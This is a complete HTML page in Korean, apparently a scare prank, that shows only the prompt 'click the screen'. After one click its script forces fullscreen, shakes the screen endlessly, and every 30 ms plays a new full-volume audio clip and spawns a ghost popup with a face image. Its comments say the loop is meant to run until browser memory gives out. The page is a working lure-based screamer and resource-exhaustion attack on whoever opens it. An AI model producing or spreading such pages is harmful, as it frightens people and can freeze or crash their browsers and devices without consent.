<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Infinity Loop</title>
    <style>
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: #000; font-family: sans-serif;
            overflow: hidden; display: flex; justify-content: center; align-items: center;
            user-select: none; cursor: pointer;
        }

        #hint-text {
            color: #555; font-size: 20px; font-weight: bold;
            letter-spacing: 2px; transition: opacity 0.2s;
        }

        /* 귀신 가상 팝업창 스타일 */
        .ghost-popup {
            position: absolute; width: 280px; height: 260px;
            background: #111; border: 2px solid #ff0000; box-shadow: 0 0 25px rgba(255,0,0,0.8);
            display: flex; flex-direction: column; z-index: 1000;
        }
        .ghost-header { background: #ff0000; height: 18px; width: 100%; }
        .ghost-img { width: 100%; height: calc(100% - 18px); object-fit: fill; }

        /* 극한의 화면 진동 무한 지속 */
        @keyframes hardcore-shake {
            0% { transform: translate(4px, 6px) rotate(0deg); }
            10% { transform: translate(-6px, -4px) rotate(-2deg); }
            20% { transform: translate(-9px, 0px) rotate(2deg); }
            30% { transform: translate(0px, 7px) rotate(0deg); }
            40% { transform: translate(5px, -5px) rotate(3deg); }
            50% { transform: translate(-4px, 6px) rotate(-2deg); }
            60% { transform: translate(-8px, 3px) rotate(0deg); }
            70% { transform: translate(6px, 4px) rotate(-3deg); }
            80% { transform: translate(-3px, -5px) rotate(2deg); }
            90% { transform: translate(7px, 7px) rotate(0deg); }
            100% { transform: translate(3px, -6px) rotate(-1deg); }
        }
        .shaking { animation: hardcore-shake 0.1s infinite; }
    </style>
</head>
<body>

    <div id="hint-text">화면을 클릭하세요</div>

    <script>
        const hintText = document.getElementById('hint-text');
        let isTriggered = false;

        document.body.addEventListener('click', () => {
            if (isTriggered) return;
            isTriggered = true;

            hintText.style.opacity = '0';

            // 전체 화면 강제 전환
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            } else if (document.documentElement.webkitRequestFullscreen) {
                document.documentElement.webkitRequestFullscreen();
            }

            // 진동 효과 무한 켜기
            document.body.classList.add('shaking');
            
            // [제한 없는 무한 루프] 브라우저 메모리가 허용하는 한 멈추지 않고 계속 증식!!
            setInterval(() => {
                playOverlapSound(); // 팝업 생성마다 사운드 폭발
                createGhostPopup();
            }, 30); // 속도를 0.03초로 더 끌어올려서 다다다다닥 폭격
        });

        // 독립 오디오 객체 무한 중첩 재생
        function playOverlapSound() {
            const audioContext = new Audio('bbb.mp4'); 
            audioContext.volume = 1.0;
            audioContext.play().catch(e => {});
        }

        // 팝업창 좌표 랜덤 무한 생성
        function createGhostPopup() {
            const popup = document.createElement('div');
            popup.className = 'ghost-popup';
            
            const maxX = window.innerWidth - 280;
            const maxY = window.innerHeight - 260;
            popup.style.left = Math.random() * maxX + 'px';
            popup.style.top = Math.random() * maxY + 'px';

            const header = document.createElement('div');
            header.className = 'ghost-header';
            popup.appendChild(header);

            const img = document.createElement('img');
            img.className = 'ghost-img';
            img.src = '니얼굴.jpg';
            popup.appendChild(img);

            document.body.appendChild(popup);
        }
    </script>
</body>
</html>
